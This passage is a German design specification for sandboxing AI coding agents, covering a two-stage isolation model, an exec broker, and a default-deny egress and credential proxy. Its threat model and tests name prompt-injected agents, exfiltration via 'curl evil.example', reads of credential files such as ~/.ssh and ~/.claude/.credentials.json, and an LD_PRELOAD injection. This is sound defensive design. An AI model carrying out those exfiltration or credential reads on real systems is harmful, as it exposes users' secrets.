# 04 — Sandbox & Egress-/Credential-Proxy

Dieses Kapitel spezifiziert die Isolation von Agent-Ausführung in beton: das **Sandbox-Provider-Interface** (`beton-sandbox`) mit den Backends Seatbelt (macOS), Landlock + seccomp + Namespaces (Linux), Windows (Beta) und Docker/Podman, das **zweistufige Modell** (Stufe 1 = Harness-Prozess, Stufe 2 = Tool-Ausführung) sowie den **Egress-/Credential-Proxy** (`beton-proxy`), über den jeglicher Netzwerkverkehr aus der Sandbox läuft. Ziel ist, dass Agents unbeaufsichtigt („YOLO-Mode“) laufen können, ohne dass Prompt-Injection, bösartige Repos oder kompromittierte Dependencies an Secrets, fremde Dateien oder beliebige Netzziele kommen.

Grundlage ist ADR-0007 (Sandbox), ergänzt durch ADR-0003 (Prozessmodell: Runner kapselt Harness), ADR-0024 (Secrets: Platzhalter `bt_cred_*`) und ADR-0011 (Auth). Policies, die Sandbox-Einstellungen erzwingen oder Browser-Aktionen regeln, stehen in POL (siehe 03-policies.md); Secret-Speicherung und Audit in SEC (siehe 05-security-identity.md); Events in PROTO-002 (siehe 06-data-sync-protocol.md). Meilensteine: macOS/Linux und Proxy in **M2**, PTY-Modus unter Sandbox in **M3**, Docker/Podman-Backend und Windows-Beta in **M5**.

## Konzepte & Begriffe

| Begriff | Bedeutung |
| --- | --- |
| **Sandbox-Provider** | Implementierung des Traits `SandboxProvider` für ein Isolations-Backend (`seatbelt`, `landlock`, `bwrap`, `windows`, `docker`, `podman`). |
| **Stufe 0** | beton-eigene Prozesse ohne Sandbox: Runner, Exec-Broker, Proxy, PTY-Multiplexer, eingebaute MCP-System-Tools, Direkt-API-Agent-Loop. Vertrauenswürdig. |
| **Stufe 1 (Harness)** | Sandbox um den Vendor-Harness-Prozess (`claude`, `codex`, ACP-Agent). Darf die **eigenen** Credential-Dateien/Keychain-Einträge des Vendors lesen und Vendor-API-Hosts erreichen. |
| **Stufe 2 (Tools)** | Strengere Sandbox für jede Tool-Ausführung (Bash, Skripte, Build-Tools, MCP-stdio-Server). Kein Zugriff auf Vendor-Credentials, Keychain oder Desktop-Session-Busse. |
| **Exec-Broker** | Stufe-0-Dienst im Runner, der Kommandoanfragen aus Stufe 1 entgegennimmt und sie in einer frischen Stufe-2-Sandbox startet (vermeidet verschachtelte Sandboxes). |
| **`bt-exec`** | Kleiner Shim (`beton __exec` bzw. `beton` unter dem Namen `bt-exec`, `bt-exec-zsh`, `bt-exec-bash`, `bt-exec-sh`), der in Stufe 1 als Shell des Harness dient und Kommandos an den Exec-Broker übergibt. |
| **Austausch** | Eigenes Verzeichnis der Session, das Stufe 1 und Stufe 2 lesen und schreiben (die cwd-Datei und Hintergrund-Ausgaben des Bash-Tools von Claude Code, `CLAUDE_CODE_TMPDIR`); nicht der Scratch der Stufe 2. In Stufe 2 entstehen dort keine Symlinks. |
| **SandboxSpec** | Deklarative Konfiguration (YAML) einer Sandbox; wird zu einer **ResolvedPolicy** (absolute, kanonische Pfade, konkrete Regeln) aufgelöst. |
| **Maske** | Pfad, der innerhalb einer freigegebenen Wurzel unsichtbar gemacht wird (Verzeichnis → leer, Datei → leer/nicht lesbar). |
| **Scratch** | Privates, beschreibbares Temp-Verzeichnis pro Session und Stufe (`TMPDIR`). |
| **Capability** | Eine vom Backend erzwingbare Eigenschaft (`fs_read`, `fs_write`, `net`, `env`, `proc`, `syscall`, `masks`). |
| **Degraded** | Zustand, in dem eine Capability nicht erzwungen wird; nur mit ausdrücklichem Opt-out zulässig und in Events/UI sichtbar. |
| **Egress-Proxy** | Rust-Proxy (`beton-proxy`), der HTTP(S) aus der Sandbox gegen Regeln prüft (Default-Deny), TLS terminiert (MITM) und Credentials injiziert. |
| **Egress-Regel** | Zeichenkette `"METHODS host/path-glob"`, z. B. `"GET,HEAD registry.npmjs.org/**"`. |
| **Passthrough** | CONNECT-Tunnel **ohne** TLS-Terminierung, nur Host-Prüfung; für Vendor-API-Hosts in Stufe 1, damit beton Subscription-Tokens nie sieht. |
| **Platzhalter** | `bt_cred_<32 Zeichen base32>`; steht im Sandbox-Environment statt eines echten Secrets; nur der Proxy kennt die Zuordnung. |
| **Credential-Binding** | Zuordnung Platzhalter → Secret-Quelle + erlaubte Hosts + Injektionsformat (`bearer`, `basic`, `git_https`, `github`, `gitlab`). |
| **beton-CA** | Pro Installation erzeugte Root-CA des Proxys; nie im System-Trust-Store, nur per Env in die Sandbox gereicht. |

## Design

### Zweistufiges Modell — Rechte-Matrix

| Ressource | Stufe 0 (Runner/Proxy/Broker) | Stufe 1 (Harness-Prozess) | Stufe 2 (Tool-Ausführung) |
| --- | --- | --- | --- |
| Workspace/Worktree lesen | ja | ja | ja |
| Workspace schreiben | ja | ja (Edit-Tools des Harness) | ja bei `workspace: rw` (Default), sonst nein |
| `<repo>/.git/hooks`, `.git/config` | ja | nur lesen | nur lesen |
| Projekt-Konfiguration `<ws>/.beton/**`, `<ws>/.claude/**` | ja | lesen/schreiben (Edit-Tools des Harness, über Policy und Freigaben) | **nur lesen**, nicht anlegbar, umbenennbar oder ersetzbar |
| Eigene Vendor-Credential-Dateien (z. B. `~/.claude/.credentials.json`, `~/.codex/auth.json`) | technisch ja, **beton liest sie nie** | ja, **nur** die vom Adapter deklarierten Pfade | **nein** (maskiert) |
| Vendor-State-Dirs (`~/.claude/projects`, `~/.codex/sessions` …) | lesen (Import, HAR-023/HAR-024, SES-008) | lesen/schreiben | nein |
| OS-Keychain / Secret Service (D-Bus) | ja (`beton-secrets`) | nur wenn Adapter `keychain: true` deklariert (macOS: Mach-Dienste des Keychains, `~/Library/Keychains` lesen/schreiben, Suchliste `com.apple.security.plist`) | **nein** |
| `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.netrc`, `~/.docker`, `~/.kube`, `~/.gnupg`, `~/.beton` | `~/.beton` ja | nein | nein |
| SSH-Agent-Socket, Docker-Socket | ja (Docker-Socket nur für Docker-Backend) | nein | nein |
| beton-API-Token (`~/.beton/auth/*`) | ja | nein; nur session-gebundenes MCP-Token | nein |
| Netzwerk | frei (Proxy-Upstream) | **nur zum Proxy**; Vendor-Hosts als Passthrough, sonst Regeln | **nur zum Proxy**, `egress_rules`, MITM |
| Exec-Broker (Unix-Socket) | ja (Dienst) | nur dieser Socket, mit Token | nein |
| Austausch | ja | lesen/schreiben | lesen/schreiben, **keine Symlinks** (auch nicht per Umbenennen) |
| Scratch der anderen Stufe, Session-Verzeichnis | ja | nein (nur eigener Scratch) | nein (nur eigener Scratch; sonst fail closed) |
| Environment | voll | Basis + Harness-Familie + `passthrough` + Broker-Zugang (+ Platzhalter des Vendor-Keys bei `auth: api_key`); `PATH` nur absolut und ohne Verzeichnisse, die Stufe 2 schreiben kann | Basis + `passthrough` + Platzhalter; `PATH` nur absolut |
| Andere Prozesse des Users (Signale, ptrace) | ja | nein | nein |
| `/tmp` | System | privater Scratch | privater Scratch |

Wie Stufe-2-Ausführung erzwungen wird, deklariert jeder Harness-Adapter als `tool_isolation` (Capabilities, HAR-002 in 01-harnesses.md): `beton` (beton führt Tools selbst aus), `shell_override` (`bt-exec` als Shell des Harness) oder `inherited` (Tools laufen im Prozess des Harness). Verifiziert gegen claude 2.1.296 und codex-cli 0.161.0 (WP-45), ohne Dateien der CLIs zu lesen (Doku, `--help`, Verhalten, Logging-Shims, Netzverbindungen über einen lokalen CONNECT-Mitschnitt) *(korrigiert gegenüber der früheren Annahme)*:
- **Direkt-API-Harness:** beton führt Tools selbst aus (`beton-workspace`, MCP-stdio-Server über den Relay-Hub) → `beton`, immer Stufe 2.
- **ACP:** `inherited`, solange beton `terminal/*` und `fs/*` nicht anbietet (M1 lehnt sie ab, der Agent führt Tools selbst aus); mit `terminal/*` über beton wird es `beton`.
- **Claude Code nativ:** `shell_override` über `CLAUDE_CODE_SHELL=<shim>/bt-exec-zsh` bzw. `bt-exec-bash` (Familie aus `SHELL`; der Pfad muss `zsh` bzw. `bash` enthalten und ausführbar sein). Claude startet damit das Bash-Tool (`-c <kommando>`), die Env-Probe (`-c env`) und den Shell-Snapshot (`-c -l <skript>`; in Stufe 2 scheitert er an der Maske von `~/.claude`, Claude läuft ohne Snapshot weiter). Die cwd-Datei `claude-<id>-cwd` und Hintergrund-Ausgaben legt Claude in `CLAUDE_CODE_TMPDIR` ab (Default `/tmp`, nicht `TMPDIR`) → `CLAUDE_CODE_TMPDIR` zeigt auf den Austausch; eigene Sockets (`cc-socks`) legt Claude unter `XDG_RUNTIME_DIR` an → Scratch der Stufe 1. **Nicht** `CLAUDE_CODE_SHELL_PREFIX`: Der Präfix umhüllt auch Hooks in Shell-Form und alle MCP-stdio-Server, auch die Relays von beton, die in Stufe 2 ihre Sockets nicht erreichen. Hooks und von Claude selbst gestartete MCP-Server laufen deshalb in Stufe 1 (Restrisiko, siehe Bedrohungsmodell).
- **Codex nativ:** `inherited`. Codex 0.161.0 startet Kommandos mit der Login-Shell aus der Benutzerdatenbank (absoluter Pfad, `-lc`); Shims für `bash`/`sh`/`zsh` vorn im `PATH` und `SHELL` wirken nicht. Die Alternativen `shell_zsh_fork` (gepatchte zsh mit `EXEC_WRAPPER`) und `codex exec-server` sind experimentell. In Stufe 1 läuft Codex mit `danger-full-access`, weil sich Seatbelt nicht verschachteln lässt.
- Kann ein Adapter Stufe 2 nicht erzwingen (`tool_isolation: inherited`), startet die Session nur mit `sandbox.require_tool_isolation: false` und ist als *degraded* markiert (`sandbox.started.degraded`).
- Bis SBX-006 (WP-49) gilt das Stufenmodell nur, wenn `sandbox.backend` ausdrücklich gesetzt ist (nicht `none`); sonst laufen Harness und Tools wie bisher über `backend: none`.

```
 Stufe 1 (Sandbox)                       Stufe 0 (Runner)                 Stufe 2 (frische Sandbox)
 claude ──Bash("npm test")──► bt-exec ──unix──► Exec-Broker ──spawn(policy_T)──► sh -c "npm test"
                                  ▲      argv, cwd, env-diff,     │  stdio-FDs (SCM_RIGHTS)       │
                                  └────── exit code, signals ◄────┴───────────────────────────────┘
```

### Sandbox-Provider-Trait (Skizze, `beton-sandbox`)

```rust
pub trait SandboxProvider: Send + Sync {
    fn id(&self) -> ProviderId;                       // seatbelt | landlock | bwrap | windows | docker | podman
    fn probe(&self) -> ProbeReport;                   // erkannte Capabilities + Gründe für fehlende
    fn resolve(&self, spec: &SandboxSpec, ctx: &ResolveCtx)
        -> Result<ResolvedPolicy, SandboxError>;      // Pfade kanonisieren, Masken expandieren, Pflicht-Caps prüfen
    fn spawn(&self, policy: &ResolvedPolicy, cmd: CommandSpec)
        -> Result<SandboxedChild, SandboxError>;      // startet Prozess(baum) isoliert
}

pub struct ProbeReport { pub caps: CapSet, pub details: BTreeMap<Cap, CapDetail>, pub version: String }
pub enum Cap { FsRead, FsWrite, Masks, Net, Env, Proc, Syscall, Resources }
pub struct ResolvedPolicy {
    pub stage: Stage,                    // Harness | Tools
    pub read_roots: Vec<CanonPath>, pub write_roots: Vec<CanonPath>, pub masks: Vec<Mask>,
    pub env: BTreeMap<String, String>,   // vollständiges, explizites Env (kein Erben)
    pub net: NetMode,                    // None | ProxyOnly { endpoint, auth_token }
    pub limits: Limits, pub required: CapSet, pub degraded: CapSet,
}
pub trait SandboxedChild { fn pid(&self) -> u32; async fn wait(&mut self) -> ExitStatus; fn kill_tree(&mut self); }
```

`SandboxError` ist strukturiert (`Unavailable { provider, missing: CapSet, hint }`, `InvalidSpec`, `PathEscape`, `SpawnFailed`) und wird als RFC-9457-Problem `sandbox_unavailable` ausgeliefert (PROTO-011, siehe 06-data-sync-protocol.md).

### Sandbox-Konfiguration (YAML)

Ort: Agent-YAML (`sandbox:`), Projekt `.beton/config.yaml`, User `~/.beton/config.yaml`. Auflösung: Agent > Projekt > User > eingebauter Default; Listen (`masks`, `env.deny`) werden vereinigt, Grants (`read_paths`, `write_paths`, `allow_hidden`, `egress_rules`, `egress_allow_private`, `env.passthrough`) kommen von der spezifischsten Ebene, `env.set` wird schlüsselweise überschrieben. Policies dürfen Sandbox-Werte nur verschärfen (AGT-014, POL-007; siehe 02-agents.md, 03-policies.md). Projekt-Konfiguration und Projekt-Agents sind Repo-Inhalt (Angreifer A2); bis entschieden ist, wie weit ein Repo der Sandbox Grants geben darf (#200), liest beton `sandbox:` nur aus der User-Konfiguration (und `BETON_CFG_SANDBOX__*`), die Projektebene lehnt den Schlüssel ab.

```yaml
sandbox:
  backend: auto              # auto | seatbelt | landlock | bwrap | windows | docker | podman | none
  preset: default            # default | dev | readonly  (SBX-012)
  require_tool_isolation: true   # false: Harness mit tool_isolation: inherited startet degraded
  workspace: rw              # rw | ro
  read_paths: [~/.cargo/registry, /opt/homebrew]
  write_paths: [~/.cache/sccache]
  masks: [.env, .env.*, secrets/]          # zusätzlich zu den Default-Masken (SBX-004)
  allow_hidden: [.venv, .cargo, .github]   # Dotfiles in Grants, die NICHT maskiert werden
  env:
    passthrough: [RUST_LOG, NODE_OPTIONS]  # Namen oder Präfixe mit *, z. B. "LC_*"
    set: { CI: "1" }
  allow_network: true        # false = gar kein Netz; true = nur über Proxy gemäß egress_rules
  egress_rules:
    - "GET,HEAD registry.npmjs.org/**"
    - "GET,HEAD static.crates.io/** index.crates.io/**"
    - "* api.github.com/repos/ifahrentholz/**"
    - "!DELETE api.github.com/**"
  egress_allow_private: []   # z. B. ["127.0.0.1:5432"]; Default: private Ziele gesperrt
  egress_passthrough: []     # Stufe 2, nur ausdrücklich: host oder host:port ohne TLS-Terminierung (PRX-005)
  dev_ports: [3000]          # Dev-Server in der Sandbox: bind/connect nur auf diesen Loopback-Ports (PRX-008 AC3)
  credentials:               # siehe PRX-006; Grant der spezifischsten Ebene (heute nur User-Konfiguration, #200)
    - { name: github, type: github, source: { secret: "secret://user/github.com/ifahrentholz" }, env: [GH_TOKEN] }
    - { name: registry, type: basic, username: deploy, hosts: [registry.example.com], source: { env: REGISTRY_PASSWORD } }
    - { name: vault, type: bearer, hosts: ["*.vault.example.com"], source: { command: [vault, print, token], ttl: 15m } }
  limits: { memory_mb: 8192, pids: 1024, cpu_seconds: null, file_size_mb: null }
  harness:                   # Stufe-1-Overrides (selten nötig)
    egress_extra: ["* mcp.example.com/**"]     # Regeln der Stufe 1 (mit MITM)
    egress_passthrough: ["api.vendor.example"] # zusätzliche Vendor-Hosts ohne TLS-Terminierung
  windows:
    allow_unenforced_network: false        # SBX-016
proxy:                       # nur User-Konfiguration
  extra_ca_files: [~/firmen-ca.pem]        # zusätzliche CAs für Upstream-TLS (PRX-002)
```

### Fail-closed-Auflösung

```
SandboxSpec ──► backend wählen (auto: macOS→seatbelt, Linux→landlock|bwrap, Windows→windows)
            ──► probe(): fehlt eine Capability aus required? ── ja ──► Fehler sandbox_unavailable
            │                                                          (kein Fallback auf unsandboxed)
            └─► resolve(): Pfade kanonisieren (realpath), Symlinks/Hardlinks prüfen, Masken expandieren
            ──► Proxy-Instanz + Credential-Bindings anlegen ──► spawn() ──► Event sandbox.started
```

### Bedrohungsmodell

**Angreifer:** (A1) Prompt-injizierter Agent, der Tools mit bösartigen Argumenten aufruft; (A2) bösartiger Repo-Inhalt (Build-Skripte, Git-Hooks, `package.json`-Scripts); (A3) kompromittierte Dependency, die während `npm install`/`cargo build` Code ausführt; (A4) Netzwerk-Gegenstelle, die DNS-Rebinding oder Redirects auf interne Ziele nutzt.
**Schutzgüter:** Vendor-Subscription-Tokens, Secrets (Git-Tokens, API-Keys), SSH-/Cloud-Credentials, Dateien außerhalb des Workspace, lokale Dienste und Cloud-Metadaten-Endpunkte, Integrität des Host-Systems (Shell-RC-Dateien, LaunchAgents, Git-Hooks).

| Bedrohung | Gegenmaßnahme | Feature |
| --- | --- | --- |
| Lesen von `~/.ssh`, `~/.aws`, Vendor-Tokens aus einem Tool | Deny-default-FS, Default-Masken, Stufentrennung | SBX-002, SBX-004 |
| Exfiltration per `curl evil.example` | Netz nur zum Proxy, Default-Deny-Regeln | SBX-007/008, PRX-001, PRX-003 |
| Zugriff auf `169.254.169.254`, `localhost:5432`, LAN | Private-IP-Sperre nach DNS-Auflösung, Pinning der geprüften IP | PRX-007 |
| Secret-Diebstahl über Env oder Transkript | Env deny-by-default, nur Platzhalter, Redaction | SBX-005, PRX-006, SEC-013 |
| Platzhalter an fremden Host senden | Host-Bindung; Fehlgebrauch → 403 + Audit | PRX-006 |
| Persistenz außerhalb des Workspace (`~/.zshrc`, LaunchAgents, `.git/hooks`) | Schreib-Grants nur Workspace/Scratch, `.git/hooks` read-only | SBX-003, SBX-004 |
| Ausbruch über Symlink/Hardlink im Workspace | `realpath` bei Auflösung, Kernel-Durchsetzung auf Inode-Ebene (Landlock/Seatbelt), Hardlink-Prüfung von Credential-Quellen | SBX-003, PRX-006 |
| Sandbox stillschweigend nicht aktiv | Fail-closed, Event `sandbox.started` mit Capabilities | SBX-006 |
| Prozesse überleben die Session | Prozessbaum-Kontrolle, PID-Namespace/Job Object | SBX-013 |

**Nicht-Ziele / Restrisiken:** Kernel-Exploits und Seitenkanäle; ein bösartiges Vendor-CLI selbst (Stufe 1 ist dem Vendor so weit vertraut wie dessen eigene Credentials); was das Vendor-CLI außerhalb seiner Shell startet, läuft in Stufe 1: Claude-Hooks und MCP-Server aus der Konfiguration des Nutzers (`~/.claude`, nur mit `harnesses.claude.isolated: true` aus; die des Repositorys lädt Claude wegen `--setting-sources user` nicht, #233) und alle Tools von Harnesses mit `tool_isolation: inherited` (Codex, ACP ohne `terminal/*`); Stufe 1 liest, was Stufe 2 in den Austausch schreibt (Inhalte regulärer Dateien, keine Symlinks; FIFOs können Stufe 1 nur blockieren); Änderungen an `.beton/` und `.claude/` durch die Edit-Tools des Harness in Stufe 1 (über Policy und Freigaben, nicht durch Stufe 2); die Integritätsprüfung erkennt einen umgangenen Exec-Broker erst am Ende des Bash-Aufrufs (das Kommando ist dann gelaufen, die Session endet); unter macOS teilen `dev_ports` das Loopback des Hosts (ein Host-Dienst auf demselben Port ist erreichbar, ein Dev-Server der Sandbox für andere lokale Prozesse); auf macOS ist Keychain-Zugriff in Stufe 1 nicht auf einzelne Einträge einschränkbar (Schutz nur durch Keychain-ACLs); auf macOS und Linux sind außerhalb der Sandbox angelegte Hardlinks auf maskierte Dateien innerhalb freigegebener Wurzeln lesbar, weil Seatbelt Pfade prüft und Landlock wie die Masken-Mounts an der Verzeichnis-Hierarchie des Zugriffspfads hängt (Datei-Grants mit mehreren Links lehnt die Auflösung ab, #203); unter Linux vor Landlock-ABI 9 Unix-Sockets mit Pfad, die ein Host-Dienst innerhalb einer Freigabe anlegt (#211); `.git/commondir` lässt sich in beiden Backends noch anlegen (#209); manipulierte Workspace-Dateien, die der User später außerhalb der Sandbox ausführt; Windows-Beta-Lücken (SBX-016).

## Features

### SBX-001 — Sandbox-Provider-Trait & Registry
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** `beton-sandbox` definiert `SandboxProvider` (probe/resolve/spawn) und eine Registry, die Backends pro Plattform registriert. Alle Prozessstarts von Harness- und Tool-Prozessen laufen ausschließlich über diese Schnittstelle; ein direkter `std::process::Command`-Spawn von Agent-Code außerhalb von `beton-sandbox` ist verboten. `backend: none` ist ein eigener Provider, der explizit gewählt werden muss.
- **Details:** Clippy `disallowed-methods` (`clippy.toml`) verbietet `std::process::Command::new`, `tokio::process::Command::new` und `process_wrap::tokio::CommandWrap::with_new`; erlaubt sind sie nur in `beton-sandbox` (künftig `beton-pty`), in Tests und für beton-eigene Stufe-0-Prozesse (git, Daemon, Browser, Editor, `beton setup`) mit begründetem `#[expect(clippy::disallowed_methods, reason = …)]`. `cargo xtask spawn-lint` hält die Ausnahmeliste fest; Harness-, Runner-, MCP- und Host-Crates haben keine Ausnahme. Bis SBX-006 (WP-49) starten die bestehenden Harness- und Tool-Prozesse über den Provider `none`; `sandbox.started` meldet dann `backend: "none"`, `caps: []`, `degraded: true`. `beton sandbox probe --json` liefert `{auto, providers: [{id, available, caps, degraded_reasons, unavailable_reason?, version}]}`; Backends, die eine Plattform (noch) nicht hat, sind registriert und melden `unavailable` mit Grund.
- **Akzeptanzkriterien:**
  - [ ] AC1 — `beton sandbox probe --json` listet alle registrierten Provider mit `caps` und je fehlender Capability einen Grund.
  - [ ] AC2 — Ein CI-Lint schlägt fehl, wenn außerhalb von `beton-sandbox`/`beton-pty` `Command::spawn` für Harness/Tools verwendet wird.
  - [ ] AC3 — `backend: auto` wählt auf macOS `seatbelt`, auf Linux `landlock` (bzw. `bwrap` gemäß SBX-009); eine unbekannte Backend-ID führt zu `InvalidSpec` beim Laden der Konfiguration.
  - [ ] AC4 — Jeder erfolgreiche Spawn erzeugt genau ein Event `sandbox.started {stage, backend, caps, degraded}`.
- **Abhängigkeiten:** PROTO-002, PROTO-011 (siehe 06-data-sync-protocol.md)
- **Referenz:** ADR-0007; Omnigent `SandboxBackend` (3.5.3)

### SBX-002 — Zweistufiges Modell & Exec-Broker
- **Meilenstein:** M2 · **Priorität:** Must
- **Beschreibung:** Harness-Prozesse laufen in Stufe 1, jede Tool-Ausführung in einer frischen Stufe-2-Sandbox, gestartet vom Exec-Broker in Stufe 0. Das vermeidet verschachtelte Sandboxes (Seatbelt kann nicht verschachtelt werden) und stellt sicher, dass Tools die Credential-Grants der Stufe 1 nicht erben. Adapter deklarieren ihre Credential-Pfade (`credential_paths`), Keychain-Bedarf (`keychain`), Env-Familien und Passthrough-Hosts; nur diese erhält Stufe 1.
- **Details:** Broker-Protokoll über einen Unix-Socket (`exec.sock`, Verzeichnis 0700, Socket 0600; Windows: Named Pipe mit ACL auf den Session-SID, M5) in einem privaten Verzeichnis des Runners, das Stufe 1 nur lesen und dessen Socket sie als einzigen verbinden darf (Seatbelt: `network-outbound` auf genau diesen Pfad; Linux: Verzeichnis sichtbar, ab Landlock-ABI 9 als einziger Ort für Unix-Verbindungen neben `/tmp` und Scratch); Stufe 2 sieht es nicht. Zuerst ein Byte mit den drei stdio-Deskriptoren (`SCM_RIGHTS`), dann Rahmen aus 4 Byte Länge und JSON: Request `{v, token, argv, cwd, env_overrides, tty, cols, rows}`, Antworten `started{pid}`, `exited{code, signal}` oder `error{code, message}`; danach schickt `bt-exec` `signal{signal}` (SIGINT, SIGTERM, SIGHUP, SIGQUIT an die Prozessgruppe). Geprüft wird fail closed: Token der Session (256 bit, Vergleich in konstanter Zeit; `BETON_EXEC_SOCKET`/`BETON_EXEC_TOKEN` stehen nur im Environment der Stufe 1), Protokollversion, absolutes Programm (`bt-exec` sucht im `PATH`), `cwd` kanonisch innerhalb der Wurzeln der Stufe 2 und außerhalb ihrer Masken, `env_overrides` nur aus einer **Allowlist** (#259): Basis- und Werkzeug-Variablen (`PATH` nur mit absoluten Einträgen – `bt-exec` lässt andere weg, der Broker lehnt sie ab –, `USER`, `LOGNAME`, `SHELL`, `TERM`, `LANG`, die Locale-Kategorien `LC_ALL`, `LC_CTYPE`, `LC_COLLATE`, `LC_MESSAGES`, `LC_MONETARY`, `LC_NUMERIC`, `LC_TIME`, `LC_ADDRESS`, `LC_IDENTIFICATION`, `LC_MEASUREMENT`, `LC_NAME`, `LC_PAPER`, `LC_TELEPHONE` (kein Präfix für beliebige `LC_*`-Namen), `TZ`, `PWD`, `OLDPWD`, `SHLVL`, `COLUMNS`, `LINES`, `COLORTERM`, `NO_COLOR`, `FORCE_COLOR`, `CLICOLOR`, `EDITOR`, `VISUAL`, `PAGER`, `LESS`, `CI`, Git-Identität und -Editor `GIT_AUTHOR_*`, `GIT_COMMITTER_*`, `GIT_EDITOR`, `GIT_PAGER`, `GIT_SEQUENCE_EDITOR`, `GIT_TERMINAL_PROMPT`, `GIT_MERGE_AUTOEDIT`, `GIT_OPTIONAL_LOCKS`, `GIT_FLUSH`; keine Credential-Helfer wie `GIT_ASKPASS` oder `GIT_CONFIG_*`) und die konfigurierten Namen der Stufe 2 (`env.passthrough`, `env.set`), die der Broker als `BETON_EXEC_ENV` (nur Namen) in die Stufe 1 gibt. Nie gesperrte (SBX-005), von beton je Stufe gesetzte (`BETON_*`, `HOME`, `TMPDIR`, `XDG_RUNTIME_DIR`, Proxy- und CA-Variablen), Harness-Variablen (`CLAUDE*`, `ANTHROPIC_*`, `CODEX_*`, `OPENAI_*`) oder Credential-Variablen der Stufe 2 (PRX-006). `bt-exec` gibt nur erlaubte Variablen weiter; was die Vendor-CLI unter neuem Namen setzt (z. B. ein Token), gelangt so nicht in Stufe 2; der Broker lehnt jede andere Variable mit `env_denied` ab (fail closed). `tty: true` lehnt der Broker bis SBX-017 (M3) ab. Das Kommando startet über die Stufe-2-Sandbox (je Start ein `sandbox.started`); der Broker hält danach keine Kopie der Deskriptoren. Endet die Verbindung, beendet er den Baum; endet das Kommando durch ein Signal, endet `bt-exec` mit demselben Signal, sonst mit dem Exit-Code, ohne Start mit 126. Der Runner (Stufe 0) setzt die Session zusammen: privates Verzeichnis mit Scratch je Stufe, Broker, CA-Bundle und Shims, eine Proxy-Instanz je Stufe (PRX-001), Stufe-2-Sandbox für Broker, MCP-stdio-Server des Relay-Hubs und `shell_exec` des Direkt-API-Harness, Stufe-1-Sandbox für den Harness mit Lese-Grants auf beton (für `bt-exec`) und das Installationsverzeichnis des Harness-Programms (samt Symlink, bei Node-Skripten auch `node`). Jeder Fehler verhindert den Start.
  *Härtung aus dem Security-Review von #228 (WP-45):*
  - **Projekt-Konfiguration verschärft nur.** `.beton/config.yaml` ist Repo-Inhalt, den Harness und Tools in der Sandbox schreiben können, und bestimmt beim nächsten Start, was in Stufe 1 läuft. Die Projektebene darf daher kein `command`, keine `extra_args`, kein `env_passthrough`, kein `isolated: false` und keine ACP-Agents setzen (Laden scheitert, fail closed; HAR-003, HAR-004, HAR-008); `sandbox:` bleibt ohnehin User-Konfiguration (#200). In Stufe 2 sind `<ws>/.beton/**` und `<ws>/.claude/**` zusätzlich nur lesbar (Seatbelt `deny file-write*`, auch Hardlinks und andere Groß-/Kleinschreibung; Linux eigener read-only Mount, Hardlinks scheitern an der Mount-Grenze). Fehlende Verzeichnisse legen beide Provider vor dem Start leer an.
  - **Austausch ohne Symlinks.** Stufe 1 liest, was Stufe 2 in den Austausch schreibt (Inhalte regulärer Dateien, keine Symlinks; FIFOs können Stufe 1 nur blockieren); Änderungen an `.beton/` und `.claude/` durch die Edit-Tools des Harness in Stufe 1 (über Policy und Freigaben, nicht durch Stufe 2); die Integritätsprüfung erkennt einen umgangenen Exec-Broker erst am Ende des Bash-Aufrufs (das Kommando ist dann gelaufen, die Session endet); ein Symlink auf `~/.claude/.credentials.json` ließe Claude die Credentials lesen. In Stufe 2 entstehen dort keine Symlinks, auch nicht per Umbenennen oder als Hardlink, und es lässt sich kein vorbereitetes Verzeichnis voller Symlinks hinein umbenennen (Seatbelt `deny file-write-create` für `vnode-type SYMLINK` und `DIRECTORY`, Unterverzeichnisse legt Claude in Stufe 1 an; Linux Landlock ohne `MAKE_SYM` und ohne `REFER`). Weil Landlock-Regeln die Rechte der Vorfahren erben, liegt der Austausch nie in einer anderen Schreib-Wurzel oder unter `/tmp`/`/dev/shm` (Auflösung lehnt ab); das Session-Verzeichnis liegt unter Linux in `/var/tmp`, sonst im temporären Verzeichnis des Benutzers. Stufe 2 erreicht davon nur ihren Scratch, den Austausch und das CA-Bundle (sonst fail closed); unter Linux verdeckt ein leeres tmpfs das Session-Verzeichnis und bindet nur diese wieder ein, damit Sockets der Stufe 1 und der Broker-Socket auch vor Landlock-ABI 9 nicht per `connect` erreichbar sind.
  - **Fail closed, falls `CLAUDE_CODE_SHELL` nicht wirkt.** Der Adapter setzt die Variablen zusätzlich über `--settings` (`env`). Gegen 2.1.296 verifiziert: Die Prozess-Umgebung gewinnt gegen `env` aus User-, Projekt- und `--settings`-Einstellungen, `--settings` wirkt auch mit `--safe-mode`. Der Runner prüft jeden abgeschlossenen `Bash`-Aufruf (außer `denied`) gegen die Starts des Exec-Brokers; fehlt einer, endet die Session (`error` mit `sandbox_integrity`, Session `failed`). Der Zähler ist global; Code, der bereits in Stufe 1 läuft, kann ihn erhöhen (Zuordnung je Tool-Call und Sperre von Shell-Starts in Stufe 1: #270).
  - **`PATH` der Stufe 1** enthält nur absolute Einträge und keine Verzeichnisse, die Stufe 2 schreiben kann. Unter macOS werden zwischen `recvmsg` und `FD_CLOEXEC` keine Prozesse gestartet (kein `MSG_CMSG_CLOEXEC`).
  - `start.sandbox.enabled` (Policies) ist `false`, wenn die Tools degraded in Stufe 1 laufen (AC4).
- **Akzeptanzkriterien:**
  - [ ] AC1 — Given Claude Code in Stufe 1, when das Bash-Tool `cat ~/.claude/.credentials.json` ausführt, then scheitert der Befehl (Permission denied/No such file), während der Harness selbst authentifiziert bleibt (manuell mit der angemeldeten CLI, Checkliste im PR; automatisiert mit Fixture-Credentials und `bt-exec`).
  - [ ] AC2 — Ein Kommando über `bt-exec` läuft nachweislich in einer Stufe-2-Sandbox (Probe meldet `stage=tools`, Keychain-Mach-Lookup bzw. D-Bus-Zugriff scheitert).
  - [ ] AC3 — Ein Broker-Request mit `cwd=/etc` oder `env_overrides={"LD_PRELOAD": …}` wird mit Fehler abgelehnt.
  - [ ] AC4 — Ein Adapter mit `tool_isolation: inherited` startet nur, wenn `require_tool_isolation: false` gesetzt ist; sonst `sandbox_unavailable` mit Hinweis.
  - [ ] AC5 — Exit-Code und Signale (SIGINT bei Interrupt) werden korrekt zwischen `bt-exec` und Stufe-2-Prozess durchgereicht (Test mit `sh -c 'exit 7'` und `sleep 60` + Interrupt).
- **Abhängigkeiten:** SBX-001, HAR-002, HAR-004, HAR-006, HAR-007 (siehe 01-harnesses.md)
- **Referenz:** ADR-0007 (zweistufig)

### SBX-003 — Sandbox-Konfiguration & Pfadauflösung
- **Meilenstein:** M2 · **Priorität:** Must
